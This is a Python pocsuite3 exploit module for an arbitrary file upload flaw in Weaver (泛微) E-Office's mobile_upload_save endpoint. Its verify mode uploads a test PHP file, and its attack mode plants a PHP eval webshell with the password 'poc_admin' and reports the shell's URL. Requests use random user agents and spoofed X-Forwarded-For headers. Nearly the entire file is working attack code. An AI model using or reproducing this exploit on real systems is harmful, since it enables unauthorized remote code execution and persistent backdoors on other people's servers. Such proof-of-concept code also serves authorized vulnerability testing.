#!/usr/bin/env python3
# -*- coding: utf-8 -*-
import random
import re
import string

from poc_tool.tools import tools
from pocsuite3.api import (
    minimum_version_required, POCBase, register_poc, requests, logger, random_str
)

minimum_version_required('2.0.5')


class DemoPOC(POCBase):
    vulID = '0'
    version = '1'
    author = ''
    vulDate = '2023-11-13'
    createDate = '2023-11-13'
    updateDate = '2023-11-13'
    references = []
    name = '泛微OA_E-Office_mobile_upload_save任意文件上传'
    appPowerLink = ''
    appName = '泛微OA_E-Office'
    appVersion = 'E-Office'
    vulType = 'upload file'
    desc = 'Vulnerability description'
    samples = ['']
    install_requires = ['']
    pocDesc = 'User manual of poc'
    dork = {'zoomeye': ''}
    suricata_request = ''
    suricata_response = ''

    def check(self, filename, filedata):
        res = self._exploit(filename, filedata)
        if 'attachment' in res.text and f'{filename}.php' in res.text and res.status_code == 200:
            s = res.text
            # 去掉字符串中的反斜杠
            formatted_string = s.replace(r'\/', '/')
            pattern = r'/attachment/(\d+)/'
            match = re.search(pattern, formatted_string)
            number = match.group(1)
            headers = {
                'User-agent': tools.get_random_ua(),
                'X-Forwarded-For': tools.get_random_ip()
            }
            res = requests.get(url=f"{self.url}/attachment/{number}/{filename}.php", headers=headers, verify=False)
            logger.debug(f"\n\n{tools.get_req(res)}\n\n{tools.get_res(res)}")
            return res

    def _exploit(self, filename, filedata):
        headers = {
            'Content-Length': '352',
            'Cache-Control': 'max-age=0',
            'Upgrade-Insecure-Requests': '1',
            'Origin': 'null',
            'User-Agent': tools.get_random_ua(),
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Accept-Language': 'en-US,en;q=0.9,zh-CN;q=0.8,zh;q=0.7',
            'Connection': 'close',
            'X-Forwarded-For': tools.get_random_ip()
        }
        files = {
            'upload_quwan': (f'{filename}.php.', f'{filedata}'),
            'file': ('', '')
        }
        res = requests.post(url=f"{self.url}/E-mobile/App/Ajax/ajax.php?action=mobile_upload_save", headers=headers,
                            files=files, verify=False)
        logger.debug(f"\n\n{tools.get_req(res)}\n\n{tools.get_res(res)}")
        return res

    def _verify(self):
        try:
            filename = ''.join(random.choice(string.ascii_lowercase) for _ in range(5))
            flag = random_str(20)
            filedata = f'<?php echo "{flag}";unlink(__FILE__);?>'
            result = {}
            res = self.check(filename, filedata)
            if flag in res.text:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['存在 泛微OA_E-Office_mobile_upload_save任意文件上传漏洞'] = self.url
            return self.parse_output(result)
        except Exception as e:
            pass

    def _attack(self):
        try:
            result = {}
            filename = 'test'
            filedata = '<?php @eval($_POST["poc_admin"]);?>'
            res = self.check(filename, filedata)
            if res.status_code == 200:
                result['VerifyInfo'] = {}
                result['VerifyInfo']['URL'] = self.url
                result['VerifyInfo']['webshell地址'] = res.url + "    类型: 蚁剑base64加密器 密码 poc_admin"
                return self.parse_output(result)
        except Exception as e:
            pass

    def _shell(self):
        return self._verify()


register_poc(DemoPOC)
